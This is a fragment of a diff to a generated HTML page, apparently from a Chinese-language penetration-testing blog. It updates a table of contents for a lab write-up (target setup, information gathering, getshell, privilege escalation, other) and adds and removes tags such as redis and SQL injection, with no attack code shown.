-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
       </div>
     </article>
   
@@ -731,6 +798,12 @@ flag : 84157165c30ad34d18945b647ec7f647
       </a>
     
       <a 
+        href="/tags/redis/" 
+        title="redis">
+        <div class="tags-list-item">redis</div>
+      </a>
+    
+      <a 
         href="/tags/XSS/" 
         title="XSS">
         <div class="tags-list-item">XSS</div>
@@ -746,12 +819,6 @@ flag : 84157165c30ad34d18945b647ec7f647
         href="/tags/Nacos/" 
         title="Nacos">
         <div class="tags-list-item">Nacos</div>
-      </a>
-    
-      <a 
-        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
-        title="SQL注入">
-        <div class="tags-list-item">SQL注入</div>
       </a>
     
   </div>
@@ -772,7 +839,7 @@ flag : 84157165c30ad34d18945b647ec7f647
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getshell"><span class="toc-text">2.getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-_u63D0_u6743"><span class="toc-text">3.提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-_u5176_u4ED6"><span class="toc-text">4.其他</span></a></li></ol>
     </article>
   
   
